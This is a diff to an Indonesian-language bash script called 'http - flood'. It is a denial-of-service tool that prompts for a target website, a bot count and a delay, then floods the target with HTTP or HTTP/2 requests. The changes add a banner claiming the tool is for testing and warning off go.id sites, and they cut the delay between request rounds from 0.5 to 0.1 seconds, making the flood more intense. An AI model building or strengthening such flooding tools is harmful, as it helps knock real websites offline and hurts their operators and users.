@@ -66,11 +66,14 @@ color_echo "$(figlet -f slant " http - flood ")"
 
 # Display protocol selection table
 color_echo "+----+------------+"
-color_echo "| No | Protocol   |"
+color_echo "| No | Protocol   | ⚠️ WARMING ⚠️"
 color_echo "+----+------------+"
-color_echo "| 1  | HTTP       |"
-color_echo "| 2  | HTTP/2     |"
+color_echo "| 1  | HTTP       | 📢 Jangan Serang Situs go.id"
+color_echo "| 2  | HTTP/2     | 📢 Tools ini dibuat untuk Testing!!!"
 color_echo "+----+------------+"
+echo ""
+echo -e "\033[0m Version 8.7 | Dev By Ro0TN3T"
+echo ""
 read -p "Masukkan nomor yang sesuai dengan pilihan Anda: " protocol_choice
 
 # Set protocol based on user choice
@@ -83,6 +86,8 @@ esac
 # Prompt for attack details
 color_echo "Masukkan Detail Serangan untuk $protocol"
 color_echo "---------------------------------"
+echo "ex : target.com or ip address"
+echo "---------------------------------"
 read -p "Target Web : " ip
 read -p "Jumlah Bot: " max
 read -p "Penundaan (milidetik, minimum 10 ms) : " delay
@@ -175,8 +180,8 @@ send_traffic_http() {
         color_echo "[$i:$j] HTTP Status Code: $http_code - $http_description"
       done) &
       #"$(echo "$delay/1000" | bc -l)"
-      sleep 0.5
-      echo -e '\033[35m Website Down'
+      sleep 0.1
+      echo -e '\033[35m  Website Is Down Target : '"$ip"
     done
 }
 
@@ -205,8 +210,8 @@ send_traffic_http2() {
         color_echo "[$i:$j] HTTP/2 Status Code: $http_code - $http_description"
       done) &
      # sleep "$(echo "$delay/1000" | bc -l)"
-     sleep 0.5
-      echo -e '\033[35m Website Down'
+     sleep 0.1
+      echo -e '\033[35m  Website Is Down Target : '"$ip"
     done
 }
 
